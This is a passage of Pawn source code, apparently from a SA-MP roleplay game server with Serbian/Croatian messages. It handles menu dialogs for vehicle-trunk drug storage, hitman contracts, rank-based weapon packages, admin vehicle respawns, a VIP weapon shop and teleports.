		    format( globalstring, sizeof( globalstring ), "* %s stavlja nesto u gepek.", ImeIgraca( playerid ) );
			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		    SendClientMessageEx( playerid, SRVBOJA1, "Stavili ste %d grama %s u gepek.", kolicina , GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) );

            if( VehicleInfo[ izbor ][ vDrugCode ][ 0 ] == 0) {
			    VehicleInfo[ izbor ][ vDrugCode ][ 0 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    VehicleInfo[ izbor ][ vDrug ][ 0 ] = kolicina;
			}
			else if( VehicleInfo[ izbor ][ vDrugCode ][ 1 ] == 0) {
			    VehicleInfo[ izbor ][ vDrugCode ][ 1 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    VehicleInfo[ izbor ][ vDrug ][ 1 ] = kolicina;
			}
			else if( VehicleInfo[ izbor ][ vDrugCode ][ 2 ] == 0) {
			    VehicleInfo[ izbor ][ vDrugCode ][ 2 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    VehicleInfo[ izbor ][ vDrug ][ 2 ] = kolicina;
			}
			else if( VehicleInfo[ izbor ][ vDrugCode ][ 3 ] == 0) {
			    VehicleInfo[ izbor ][ vDrugCode ][ 3 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    VehicleInfo[ izbor ][ vDrug ][ 3 ] = kolicina;
			}
			else if( VehicleInfo[ izbor ][ vDrugCode ][ 4 ] == 0) {
			    VehicleInfo[ izbor ][ vDrugCode ][ 4 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    VehicleInfo[ izbor ][ vDrug ][ 4 ] = kolicina;
			}
			else if( VehicleInfo[ izbor ][ vDrugCode ][ 5 ] == 0) {
			    VehicleInfo[ izbor ][ vDrugCode ][ 5 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
			    VehicleInfo[ izbor ][ vDrug ][ 5 ] = kolicina;
			}
			SaveVehicle( izbor );

			if( PlayerInfo[ playerid ][ xDrug ][ slot2 ] <= 0)
			    PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 0;
		}
	}
	else if( dialogid == dialog_VEHICLETAKEDRUG ) {
	    if( !response ) return 1;
		if( response ) {
		    new slot, slot2, kolicina, izbor = ChosenVehicle[ playerid ];
		    if( sscanf( inputtext, "dd", slot, kolicina ) ) return SPD( playerid, dialog_VEHICLETAKEDRUG, DSI, D_NASLOV, "Unesite slot droge u vozilu i kolicinu droge za uzimanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );

		   	if( slot < 1 || slot > 6 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			if( VehicleInfo[ izbor ][ vDrugCode ][ slot2 ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo nema drogu pod tim slotom!");
	       	if( kolicina < 1 || kolicina > VehicleInfo[ izbor ][ vDrug ][ slot2 ] ) return SendErrorMessage( playerid, "Ovo vozilo nema toliko droge pod tim slotom!");

			VehicleInfo[ izbor ][ vDrug ][ slot2 ] -= kolicina;
		    format( globalstring, sizeof( globalstring ), "* %s uzima nesto iz gepeka.", ImeIgraca( playerid ) );
			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
			SendClientMessageEx( playerid, SRVBOJA1, "Uzeli ste %d grama %s iz gepeka.", kolicina, GetDrugNameByDrugID( VehicleInfo[ izbor ][ vDrugCode ][ slot2 ] ) );

			if( PlayerInfo[ playerid ][ xDrugCode ][ 0 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 0 ] = VehicleInfo[ izbor ][ vDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 0 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 1 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 1 ] = VehicleInfo[ izbor ][ vDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 1 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 2 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 2 ] = VehicleInfo[ izbor ][ vDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 2 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 3 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 3 ] = VehicleInfo[ izbor ][ vDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 3 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 4 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 4 ] = VehicleInfo[ izbor ][ vDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 4 ] = kolicina;
			}

			if( VehicleInfo[ izbor ][ vDrug ][ slot2 ] <= 0 )
			    VehicleInfo[ izbor ][ vDrugCode ][ slot2 ] = 0;

			SaveVehicle( izbor );
		}
	}
	else if( dialogid == dialog_PORTABLE ) {
	    if( !response ) return 1;
		if( response ) {
		    switch( listitem ) {
		        case 0: {
		            if( PlayerInfo[ playerid ][ xRank ] < 4 ) return SendErrorMessage( playerid, "Samo Rank 4 Agencije ili preko moze da dodjeli mete !" );
				    SearchingHit( playerid );
		        }
		        case 1: {
		            if( PlayerInfo[ playerid ][ xRank ] < 4 ) return SendErrorMessage( playerid, "Samo Rank 4 Agencije ili preko moze da dodjeli mete !" );
				    if( hitfound == 0 ) return SendErrorMessage( playerid, "Trenutno nema pronadjenih meta, koristite prvo /hitman da vidite dostupne mete!");
					SPD( playerid, dialog_GIVEHIT, DSI, D_NASLOV, "Unesite ID ubojice kojem dajete metu:", D_ODABERI, D_ODUSTANI );
				}
				case 2: {
				    SCM( playerid, BELA, "|__________________ Rankovi Agencije __________________|");
				    new string[ 64 ], OrgID = PlayerInfo[ playerid ][ xClan ];
					foreach( Player, i ) {
                        if( IsPlayerConnected( i ) && PlayerLogged[ i ] == true && PlayerInfo[ i ][ xClan ] == OrgID ) {
						    format( string, sizeof( string ), "* %s: Rank %d", ImeIgraca( i ), PlayerInfo[ i ][ xRank ] );
							SCM( playerid, SIVA, string );
						}
					}
				}
				case 3: {
    				SPD( playerid, dialog_HORDER, DSL, "Dostupni Paketi", "Paket 1($200)Rank 1+\nPaket 2($300)Rank 2+\nPaket 3($500)Rank 3+\nPaket 4($750)Rank 4+\nPaket 5($1000)Rank 5+", D_ODABERI, D_ODUSTANI );
				}
			}
		}
	}
	else if( dialogid == dialog_GIVEHIT ) {
	    if( !response ) return 1;
		if( response ) {
		    new id;
            if( sscanf( inputtext, "u", id ) ) return SendErrorMessage( playerid, "Krivi id" );
	        if( id == INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Krivi id" );
	        if( OI[ PlayerInfo[ id ][ xClan ] ][ oTip ] != ORG_TIP_HITM ) return SendErrorMessage( playerid, "Taj igrac nije clan agencije!");
			if( HitmanInfo[ id ][ GoChase ] < 999 ) return SendErrorMessage( playerid, "Taj clan ima vec dodjeljenu metu !");
			if( PlayerInfo[ ahitid ][ xHitmenCena ] == 0 ) return SendErrorMessage( playerid, "Prvo moras da vidis kontrakte." );
			if( IsPlayerConnected( ahitid ) ) {
                for( new a = 1; a < MAX_ORG; a++) {
		    		if( OI[ a ][ oTip ] == ORG_TIP_HITM ) {
		    		    format( globalstring, sizeof( globalstring ), "* Hitman %s, je dodelio ubojici %s-u da ubije: %s(ID:%d), za $%d.", ImeIgraca( playerid ), ImeIgraca( id ), ImeIgraca( ahitid ), ahitid, PlayerInfo[ ahitid ][ xHitmenCena ] );
                   		OrgPoruka( a, ZUTA, globalstring );
					}
				}
				HitmanInfo[ id ][ GoChase ] = ahitid;
		   		HitmanInfo[ ahitid ][ GetChased ] = id;
		   		HitmanInfo[ ahitid ][ GotHit ] = 1;
		   		ahitid = 0;
		   		hitfound = 0;
			}
			else return SendErrorMessage( playerid, "Meta je trenutno offline, potrazite nove !");
		}
	}
	else if( dialogid == dialog_HORDER ) {
	    if( !response ) return 1;
		if( response ) {
		    switch( listitem ) {
		    	case 0: {
		    	    if( PlayerInfo[ playerid ][ xRank ] < 1 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 200 ) {
			        	SCM( playerid, SVETLOPLAVA, "* Narucili ste paket, cena ovog paketa je 200$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 100 );
						GiveWeaponToPlayer( playerid, 4, 1 );
			            DajIgracuNovac( playerid, -200 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
				case 1: {
		    	    if( PlayerInfo[ playerid ][ xRank ] < 2 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 300 ) {
			        	SCM( playerid, SVETLOPLAVA, "* Narucili ste paket, cena ovog paketa je 300$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 50 );
						GiveWeaponToPlayer( playerid, 31, 500 );
						GiveWeaponToPlayer( playerid, 4, 1 );
			            DajIgracuNovac( playerid, -300 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
				case 2: {
		    	    if( PlayerInfo[ playerid ][ xRank ] < 3 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 500 ) {
			        	SCM( playerid, SVETLOPLAVA, "* Narucili ste paket, cena ovog paketa je 500$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 50 );
						GiveWeaponToPlayer( playerid, 30, 500 );
						GiveWeaponToPlayer( playerid, 4, 1 );
			            DajIgracuNovac( playerid, -500 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
				case 3: {
		    	    if( PlayerInfo[ playerid ][ xRank ] < 4 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 750 ) {
			        	SCM( playerid, SVETLOPLAVA, "* Narucili ste paket, cena ovog paketa je 750$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 50 );
						GiveWeaponToPlayer( playerid, 31, 500 );
						GiveWeaponToPlayer( playerid, 4, 1 );
						GiveWeaponToPlayer( playerid, 34, 20 );
			            DajIgracuNovac( playerid, -750 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
				case 4: {
		    	    if( PlayerInfo[ playerid ][ xRank ] < 5 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 1000 ) {
			        	SCM( playerid, SVETLOPLAVA, "* Narucili ste paket, cena ovog paketa je 1000$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 50 );
						GiveWeaponToPlayer( playerid, 30, 500 );
						GiveWeaponToPlayer( playerid, 4, 1 );
						GiveWeaponToPlayer( playerid, 34, 20 );
			            DajIgracuNovac( playerid, -1000 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
		    }
		}
	}
	else if( dialogid == dialog_RESETIRAJ ) {
	    if( !response ) return 1;
		if( response ) {
		    switch( listitem ) {
		    	case 0: {
		    	    if( ServerInfo[ RRVehicle ] == true  ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
		            if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		            SetTimerEx( "RespawnCall", 15000, false, "dd", playerid, 1 );
		            format( globalstring, sizeof( globalstring ), "|RESPAWN| Admin %s je aktivirao respawn praznih osobnih vozila!", ImeIgraca( playerid ) );
		            SCMA( 0xFFC0CBAA, globalstring );
		            SCMA( 0xFFC0CBAA, "|RESPAWN| Respawn ce biti pokrenut za 15 sekundi." );
		    	}
		    	case 1: {
		    	    if( ServerInfo[ RRVehicle ] == true  ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
		            if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		            SetTimerEx( "RespawnCall", 15000, false, "dd", playerid, 2 );
		            format( globalstring, sizeof( globalstring ), "|RESPAWN| Admin %s je aktivirao respawn praznih poslovnih vozila!", ImeIgraca( playerid ) );
		            SCMA( 0xFFC0CBAA, globalstring );
		            SCMA( 0xFFC0CBAA, "|RESPAWN| Respawn ce biti pokrenut za 15 sekundi." );
		    	}
				case 2: {

                    SendErrorMessage(playerid, "Opcija iskljucena!");
		    	    // if( ServerInfo[ RRVehicle ] == true  ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
           //          if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		         //    SetTimerEx( "RespawnCall", 15000, false, "dd", playerid, 3 );
		         //    format( globalstring, sizeof( globalstring ), "|RESPAWN| Admin %s je aktivirao respawn praznih organizacijskih vozila!", ImeIgraca( playerid ) );
		         //    SCMA( 0xFFC0CBAA, globalstring );
		         //    SCMA( 0xFFC0CBAA, "|RESPAWN| Respawn ce biti pokrenut za 15 sekundi." );
		    	}
		    	case 3: {
		    	    if( ServerInfo[ RRVehicle ] == true  ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
                    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		            SetTimerEx( "RespawnCall", 15000, false, "dd", playerid, 4 );
		            format( globalstring, sizeof( globalstring ), "|RESPAWN| Admin %s je aktivirao respawn praznih rentanih vozila!", ImeIgraca( playerid ) );
		            SCMA( 0xFFC0CBAA, globalstring );
		            SCMA( 0xFFC0CBAA, "|RESPAWN| Respawn ce biti pokrenut za 15 sekundi." );
		    	}
		    	case 4: {
		    	    if( ServerInfo[ RRVehicle ] == true  ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
                    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		            SetTimerEx( "RespawnCall", 15000, false, "dd", playerid, 5 );
		            format( globalstring, sizeof( globalstring ), "|RESPAWN| Admin %s je aktivirao respawn svih vozila!", ImeIgraca( playerid ) );
		            SCMA( 0xFFC0CBAA, globalstring );
		            SCMA( 0xFFC0CBAA, "|RESPAWN| Respawn ce biti pokrenut za 15 sekundi." );
		    	}
		    	case 5: {
		    	    if( ServerInfo[ RRVehicle ] == true  ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
		    	    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		    	    for( new i = 0; i < MAX_VEHICLES; i++ ) {
						if( IsValidVehicle( i ) && IsVehiclePrikolica( i ) ) {
							SetVehicleToRespawn( i );
						}
					}
					format( globalstring, sizeof( globalstring ), "|RESPAWN| %s je respawnao sve cisterne!", ImeIgraca( playerid ) );
		            AdminPoruka( 0xFFC0CBAA, globalstring );
		    	}
			}
		}
	} 
	else if( dialogid == dialog_SELECTVGUN ) { 
	    if( !response ) return 1;
		if( response ) {
		    switch( listitem ) { 
			    case 0: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 9500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 9.500$!");
					DajIgracuNovac( playerid, -9500 );
					GiveWeaponToPlayer( playerid, 25, 50 );
					SendInfoMessage( playerid, "Kupili ste Shotgun sa 50 metaka za 9.500$." );

                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }

			    }
			    case 1: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 1000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 1.000$!");
					DajIgracuNovac( playerid, -1000 );
					GiveWeaponToPlayer( playerid, 5, 1 );
					SendInfoMessage( playerid, "Kupili ste palicu za 1.000$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 2: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 1000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 1.000$!");
					DajIgracuNovac( playerid, -1000 );
					GiveWeaponToPlayer( playerid, 14, 1 );
					SendInfoMessage( playerid, "Kupili ste cvece za 1.000$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 3: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 2 ) return SendErrorMessage( playerid, "Ovo oruzje moze da kupi samo VIP Level 2+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 7000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 7.000$!");
					DajIgracuNovac( playerid, -7000 );
					GiveWeaponToPlayer( playerid, 24, 50 );
					SendInfoMessage( playerid, "Kupili ste deagle sa 50 metaka za 7.000$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 4: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 4000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 4.000$!");
					DajIgracuNovac( playerid, -4000 );
					GiveWeaponToPlayer( playerid, 22, 100 );
					SendInfoMessage( playerid, "Kupili ste Pistol 9mm sa 100 metaka za 4.000$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 5: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 9000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 9.000$!");
					DajIgracuNovac( playerid, -9000 );
					GiveWeaponToPlayer( playerid, 28, 150 );
					SendInfoMessage( playerid, "Kupili ste Uzi sa 150 metaka za 9.000$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 6: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 9500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 9.500$!");
					DajIgracuNovac( playerid, -9500 );
					GiveWeaponToPlayer( playerid, 29, 150 );
					SendInfoMessage( playerid, "Kupili ste MP5 sa 150 metaka za 9.500$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 7: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 11000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 11.000$!");
					DajIgracuNovac( playerid, -11000 );
					GiveWeaponToPlayer( playerid, 31, 200 );
					SendInfoMessage( playerid, "Kupili ste M4 sa 200 metaka za 11.000$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 8: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 11500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 11.500$!");
					DajIgracuNovac( playerid, -11500 );
					GiveWeaponToPlayer( playerid, 30, 200 );
					SendInfoMessage( playerid, "Kupili ste AK47 sa 200 metaka za 11.500$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 9: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 12000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 12.000$!");
					DajIgracuNovac( playerid, -12000 );
					Novi_SetPlayerArmour( playerid, 100 );
					SendInfoMessage( playerid, "Kupili ste pancir za 10.000$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			    case 10: {
			        if( PlayerInfo[ playerid ][ xNovac ] < 20000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 20.000$!");
					DajIgracuNovac( playerid, -20000 );
					GiveWeaponToPlayer( playerid, 34, 30 );
					SendInfoMessage( playerid, "Kupili ste Sniper sa 10 metaka za 20.000$." );
                    if(PlayerInfo[playerid][xVIPLevel] >= 4) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 4: 
                                time = 120;
                            case 5:
                                time = 80;
                            case 6:
                                time = 50;
                        }
                        VipMenuTime[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci /vipmenu mozete koristiti za %d sekundi!", time);
                    }
			    }
			}
		}
	}
	else if( dialogid == dialog_SELECTPPORT ) {
	    if( !response ) return 1;
		if( response ) {
		    new tmpcar = GetPlayerVehicleID( playerid );
			switch( listitem ) {
			    case 0: {
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1075.4614,1266.7227,10.8199 ); }
					else { PortajIgraca( playerid, 1075.4614,1266.7227,10.8199 ); }
					SendInfoMessage( playerid, "Teleportovao si kod Promoter baze." );
					format( globalstring, sizeof( globalstring ), "PPORT | %s se teleportovao do Promoter baze", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 1: {
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1713.0856,-1280.9054,13.3828 ); }
					else { PortajIgraca( playerid, 1713.0856,-1280.9054,13.3828 ); }
					SendInfoMessage( playerid, "Teleportovao si kod Banke." );
					format( globalstring, sizeof( globalstring ), "PPORT | %s se teleportovao do Banke", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 2: {
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1224.4867,-932.7758,42.5844 ); }
					else { PortajIgraca( playerid, 1224.4867,-932.7758,42.5844 ); }
					SendInfoMessage( playerid, "Teleportovao si kod Burga." );
					format( globalstring, sizeof( globalstring ), "PPORT | %s se teleportovao do Burga", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 3: {
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1473.4469,-1719.0601,13.7969 ); }
					else { PortajIgraca( playerid, 1473.4469,-1719.0601,13.7969 ); }
					SendInfoMessage( playerid, "Teleportovao si kod Opstine." );
					format( globalstring, sizeof( globalstring ), "PPORT | %s se teleportovao do Opstine", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			}
			PromoterPort[ playerid ] = 60;
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
		}
	}
	else if( dialogid == dialog_SELECTVPORT ) {
	    if( !response ) return 1;
		if( response ) {
      		new tmpcar = GetPlayerVehicleID( playerid );
			switch( listitem ) {
			    case 0: {
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1974.7805, -3.4674, 31.1553 ); }
					else { PortajIgraca( playerid, 1974.7805, -3.4674, 31.1553 ); }
					SendInfoMessage( playerid, "Teleportovao si kod VIP baze." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do VIP baze", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 1: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 2 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 2+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1383.2295, -1567.4021, 13.5917 ); }
					else { PortajIgraca( playerid, 1383.2295, -1567.4021, 13.5917 ); }
					SendInfoMessage( playerid, "Teleportovao si do Los Santosa." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Los Santosa", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 2: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 2 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 2+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, -2221.5232, -75.1872, 35.1719 ); }
					else { PortajIgraca( playerid, -2221.5232, -75.1872, 35.1719 ); }
					SendInfoMessage( playerid, "Teleportovao si do San Fierra." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do San Fierra", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 3: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 2 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 2+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 2035.0367, 1395.2092, 10.8203 ); }
					else { PortajIgraca( playerid, 2035.0367, 1395.2092, 10.8203 ); }
					SendInfoMessage( playerid, "Teleportovao si do Las Venturasa." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Las Venturasa", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 4: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 3 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 3+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1216.3055, -937.5020, 42.3694 ); }
					else { PortajIgraca( playerid, 1216.3055, -937.5020, 42.3694 ); }
					SendInfoMessage( playerid, "Teleportovao si do Burga." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Burga", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 5: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 3 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 3+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1458.6901, -1034.5754, 23.3609 ); }
					else { PortajIgraca( playerid, 1458.6901, -1034.5754, 23.3609 ); }
					SendInfoMessage( playerid, "Teleportovao si do Banke." );
